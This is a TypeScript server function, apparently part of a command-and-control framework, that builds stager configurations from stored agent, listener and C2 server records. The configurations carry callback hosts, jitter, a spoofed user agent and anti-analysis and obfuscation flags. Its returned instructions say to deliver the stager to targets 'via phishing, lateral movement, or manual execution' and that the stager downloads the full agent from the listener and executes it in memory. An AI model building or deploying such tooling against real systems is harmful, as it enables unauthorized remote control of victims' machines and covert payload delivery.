import { createClientFromRequest } from 'npm:@base44/sdk@0.8.6';

Deno.serve(async (req) => {
  try {
    const api = createClientFromRequest(req);
    const user = await api.auth.me();

    if (!user) {
      return Response.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const body = await req.json();
    const {
      agent_id,
      c2_server_id,
      listener_id,
      platform = 'windows',
      architecture = 'x64',
      output_format = 'exe'
    } = body;

    if (!agent_id || !c2_server_id || !listener_id) {
      return Response.json({
        error: 'Missing required parameters: agent_id, c2_server_id, listener_id'
      }, { status: 400 });
    }

    // Fetch agent profile
    const agents = await api.entities.Agent.filter({ id: agent_id });
    if (!agents || agents.length === 0) {
      return Response.json({ error: 'Agent profile not found' }, { status: 404 });
    }

    const agent = agents[0];

    // Fetch listener config
    const listeners = await api.entities.Listener.filter({ id: listener_id });
    if (!listeners || listeners.length === 0) {
      return Response.json({ error: 'Listener not found' }, { status: 404 });
    }

    const listener = listeners[0];

    // Fetch C2 server
    const c2Servers = await api.entities.C2Server.filter({ id: c2_server_id });
    if (!c2Servers || c2Servers.length === 0) {
      return Response.json({ error: 'C2 server not found' }, { status: 404 });
    }

    const c2Server = c2Servers[0];

    // Generate stager config from agent/listener (payload format for framework integration)
    const stagerConfig = {
      c2_host: listener.host,
      c2_port: listener.port,
      c2_endpoint: listener.endpoint,
      c2_protocol: listener.protocol,
      callback_interval: agent.callback_interval,
      jitter: agent.jitter,
      user_agent: agent.user_agent_string || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      encryption: agent.encryption,
      beacon_id: crypto.randomUUID(),
      agent_id: agent_id,
      anti_analysis: agent.anti_analysis,
      obfuscation: agent.obfuscation_enabled
    };

    // Encode stager config for delivery (agent framework consumes this)
    const stagerBase64 = btoa(JSON.stringify(stagerConfig));

    // Create beacon record for this stager
    const beaconId = crypto.randomUUID();

    // Generate download URL
    const downloadUrl = `/download/stager_${beaconId}.${output_format}`;

    return Response.json({
      status: 'generated',
      beacon_id: beaconId,
      stager_config: stagerConfig,
      payload_size_bytes: stagerBase64.length,
      download_url: downloadUrl,
      format: output_format,
      platform: platform,
      architecture: architecture,
      instructions: {
        delivery: `Deliver stager to target via phishing, lateral movement, or manual execution`,
        execution: platform === 'windows' ?
          'Execute: stager.exe' :
          'Execute: ./stager',
        behavior: 'Stager will download full agent from listener and execute in-memory'
      }
    });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});